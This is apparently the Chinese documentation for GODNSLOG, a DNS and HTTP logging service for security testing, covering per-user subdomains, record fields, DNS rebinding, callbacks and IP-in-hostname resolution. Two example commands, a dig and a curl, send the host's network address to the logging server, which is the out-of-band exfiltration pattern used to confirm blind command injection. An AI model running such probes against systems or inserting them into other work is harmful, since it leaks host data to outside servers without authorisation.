# 简介

GODNSLOG功能特性:

- 多用户
- DNSLOG
- HTTPLOG 记录
- DNS Rebinding
- 记录结果推送
- xip任意ip解析


每一个`GODNSLOG`用户会分配一个唯一的域名，域名前缀为`shortId`是godnslog平台的唯一用户标识。 `安全设置`页面中如下图

![](https://s1.ax1x.com/2020/08/31/dXPXGR.png)

`712hu2c4gy34.godnslog.com`是给当前用户分配的唯一域名，`712hu2c4gy34`为`shortId`区分用户, 三级域名`*.712hu2c4gy34.godnslog.com`下所有DNS请求记录均会被记录下来，`*`字段由用户自定义，建议跟扫描ID对应起来，用来关联扫描结果。 


## DNS LOG功能

每个用户分配一个唯一的三级域名，该域名或其子域名的所有解析记录均会被记录。
请求记录超过设置的最长时间会被自动清理，自动清理时间设置范围是1-48小时


```bash
dig `/sbin/ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`.712hu2c4gy34.godnslog.com
```

系统生成域名为`{$variable}.712hu2c4gy34.godnslog.com`，其中`712hu2c4gy34`是用户唯一shortId，`{$variable}`为用户自定义变量


![](https://s1.ax1x.com/2020/08/31/dXPba4.png)


DNSLOG 记录内容包含以下字段：
- domain
- IP
- 记录时间

请求记录超过设置的最长时间会被自动清理，自动清理时间设置范围是1-48小时


## DNS Rebinding

详见rebinding页面[](/document/rebinding)

## HTTP LOG功能

GODNSLOG 的`/log/`接口提供了HTTPLOG的功能，访问`http://${IP}/log/${shortId}/${variable}`的记录都会被记录下来

记录内容包含以下字段:

- IP
- Method
- Path
- User-Agent
- Content-Type 类型
- Data body数据
- 记录时间

```bash
curl http://100.100.100.100/log/ktqlujjpgc4j/`/sbin/ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`
```
请求记录超过设置的最长时间会被自动清理，自动清理时间设置范围是1-48小时

![](https://s1.ax1x.com/2020/08/31/dXiiIH.png)

## 主动推送

在配置->系统->基础设置中填写callback，GODNSLOG会在接收到DNSLOG或者HTTPLOG时向此回调地址主动推送本次日志记录

![](https://s1.ax1x.com/2020/08/31/dXicy6.png)


## xip

http://godnslog.com

	   10.0.0.1.godnslog.com   resolves to   10.0.0.1
	      www.10.0.0.1.godnslog.com   resolves to   10.0.0.1
	   mysite.10.0.0.1.godnslog.com   resolves to   10.0.0.1
	  foo.bar.10.0.0.1.godnslog.com   resolves to   10.0.0.1

## 编辑文档

文档目录位于`$SRC/frontend/src/md/`目录下，通过raw-loader加载，修改对应的markdown页面内容即可更新，欢迎大家提交PR。


## 致谢

GODNSLOG在设计中大量参考了[CEYE.IO](http://ceye.io)，包括本文档的内容也是，在此向`CEYE.IO`平台致敬。

[CEYE.IO](http://ceye.io)
[dnslog](https://github.com/fanjq99/dnslog)
